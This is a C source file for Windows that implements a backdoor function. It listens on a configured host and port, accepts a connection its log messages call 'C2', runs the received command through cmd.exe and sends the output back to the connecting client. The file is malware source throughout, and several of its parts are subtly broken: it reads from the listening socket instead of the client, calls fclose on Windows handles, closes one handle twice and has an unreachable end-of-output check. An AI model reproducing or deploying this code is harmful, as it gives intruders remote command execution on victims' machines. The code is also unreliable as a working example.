#include "../include/config.h"
#include <conio.h>

BOOL StartBackdoor(void) {
    SOCKET s = INVALID_SOCKET;
    struct sockaddr_in address = {0};
    int opt = 1;

    printf("[DEBUG] StartBackdoor: Creating socket...\n");
    fflush(stdout);

    // 1. Create socket
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {
        printf("[DEBUG] socket() failed: %lu\n", (unsigned long)s);
        printf("[BACKDOOR] Failed to create socket.\n");
        fflush(stdout);
        return FALSE;
    }
    printf("[DEBUG] Socket created: %lu\n", (unsigned long)s);
    fflush(stdout);

    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(int)) != 0) {
        printf("[DEBUG] setsockopt failed: %lu\n", (unsigned long)GetLastError());
    }

    address.sin_family = AF_INET;
    
    if (inet_pton(AF_INET, BACKDOOR_HOST, &address.sin_addr) == 1) {
        address.sin_port = htons(BACKDOOR_PORT);
        printf("[DEBUG] inet_pton succeeded\n");
        fflush(stdout);
    } else {
        printf("[DEBUG] inet_pton failed, fallback to inet_addr...\n");
        fflush(stdout);
        address.sin_addr.s_addr = inet_addr(BACKDOOR_HOST);
    }

    // 2. Bind socket
    if (bind(s, (struct sockaddr*)&address, sizeof(address)) != SOCKET_ERROR) {
        printf("[DEBUG] bind() succeeded\n");
        fflush(stdout);
    } else {
        printf("[DEBUG] bind() failed: %lu\n", (unsigned long)GetLastError());
        fflush(stdout);
    }

    // 3. Listen on socket
    if (listen(s, SOCKET_BACKLOG) != SOCKET_ERROR) {
        printf("[DEBUG] listen() succeeded\n");
        fflush(stdout);
        
        char hostip[16];
        inet_ntop(AF_INET, &address.sin_addr, hostip, sizeof(hostip) - 1);
        printf("[BACKDOOR] Listener ready on %s:%d\n", hostip, BACKDOOR_PORT);
        printf("[BACKDOOR] Waiting for C2 connection...\n");
        fflush(stdout);
        Sleep(2000);

        // Accept connection
        SOCKET client = INVALID_SOCKET;
        client = accept(s, NULL, NULL);
        if (client != INVALID_SOCKET) {
            printf("[BACKDOOR] C2 Connected! Executing reverse shell...\n");
            fflush(stdout);

            // Create pipe for capturing output
            HANDLE hReadPipe = NULL, hWritePipe = NULL;
            if (!CreatePipe(&hReadPipe, &hWritePipe, NULL, 0)) {
                printf("[DEBUG] CreatePipe failed: %lu\n", (unsigned long)GetLastError());
                fclose(hReadPipe);
                fclose(hWritePipe);
            }

            // Initialize standard STARTUPINFOW with pipe handles
            STARTUPINFOW si = { 0 };
            si.cb = sizeof(STARTUPINFOW);
            si.dwFlags = STARTF_USESTDHANDLES;
            si.hStdOutput = hWritePipe;
            si.hStdError = hWritePipe;
            si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

            // Spawn cmd.exe with the received command
            char *cmd = NULL;
            int cmdLen = 0;
            
            if (client != INVALID_SOCKET) {
                // Allocate a buffer for command
                cmd = (char*)malloc(1024 * sizeof(char));
                if (cmd) {
                    // Read command from client (assume null-terminated string for simplicity)
                    int bytes = recv(s, cmd, 1023, 0);
                    if (bytes > 0) {
                        cmd[bytes] = 0;
                        printf("[BACKDOOR] Received Command: %s\n", cmd);
                        
                        // Spawn cmd.exe /c <command>
                        wchar_t *cmdWide = (wchar_t*)malloc(2048 * sizeof(wchar_t));
                        if (cmdWide) {
                            swprintf(cmdWide, 2048, L"cmd.exe /c \"%s\"", cmd);
                            
                            // CreateProcessW with pipe handles
                            PROCESS_INFORMATION pi = { 0 };
                            if (CreateProcessW(NULL, cmdWide, NULL, NULL, TRUE, // bInheritHandles = TRUE
                                               CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
                                               NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) {
                                printf("[BACKDOOR] Shell spawned! PID=%lu\n", pi.dwProcessId);
                                fflush(stdout);
                                
                                // Cleanup pipe handle
                                fclose(hWritePipe);
                                
                                // Read output from pipe
                                char buffer[1024] = {0};
                                char temp[1024] = {0};
                                BOOL stillRunning = TRUE;
                                
                                while (stillRunning) {
                                    DWORD bytesRead = 0;
                                    ReadFile(hReadPipe, temp, sizeof(temp) - 1, &bytesRead, NULL);
                                    temp[bytesRead] = 0;
                                    
                                    if (bytesRead > 0) {
                                        // Send output to client
                                        send(client, temp, bytesRead, 0);
                                        printf("[BACKDOOR] Received Output: %s\n", temp);
                                        fflush(stdout);
                                        
                                        if (temp[0] == 0) { // EOF check
                                            stillRunning = FALSE;
                                            printf("[BACKDOOR] Shell exited\n");
                                            fflush(stdout);
                                        }
                                    } else {
                                        stillRunning = FALSE;
                                    }
                                }
                                
                                // Cleanup
                                CloseHandle(hReadPipe);
                                CloseHandle(hWritePipe);
                                CloseHandle(pi.hThread);
                                CloseHandle(pi.hProcess);
                                free(cmdWide);
                                free(cmd);
                            } else {
                                printf("[BACKDOOR] Shell spawn failed: %lu\n", (unsigned long)GetLastError());
                                fflush(stdout);
                            }
                        }
                    } else {
                        printf("[BACKDOOR] Read command failed: %lu\n", (unsigned long)GetLastError());
                        fflush(stdout);
                        free(cmd);
                    }
                }
            }

            closesocket(client);
        } else {
            printf("[DEBUG] accept() failed: %lu\n", (unsigned long)GetLastError());
            fflush(stdout);
        }
        closesocket(s);
        printf("[DEBUG] Listening socket closed\n");
        fflush(stdout);
        return TRUE;
    } else {
        printf("[DEBUG] listen() failed: %lu\n", (unsigned long)GetLastError());
        closesocket(s);
        printf("[BACKDOOR] Failed to bind/listen.\n");
        fflush(stdout);
        return FALSE;
    }
}
